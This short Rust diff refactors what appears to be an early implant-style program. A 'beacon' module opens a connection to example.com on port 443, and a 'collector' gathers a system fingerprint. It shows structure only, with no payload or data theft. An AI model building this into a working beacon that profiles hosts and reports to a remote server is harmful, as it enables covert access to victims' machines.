@@ -1,5 +1,3 @@
-use log::debug;
-
 mod beacon;
 mod collector;
 
@@ -9,10 +7,8 @@ pub fn init_logging() {
 }
 
 pub fn run() -> windows::core::Result<()> {
-    let _beacon = beacon::Beacon::new("example.com", 443)?;
-
-    let sysinfo = collector::SystemFingerprint::collect()?;
-    debug!("arch: {}", sysinfo.system.arch);
+    let mut beacon = beacon::Beacon::new()?;
+    beacon.init_conn("example.com", 443)?;
 
     Ok(())
 }
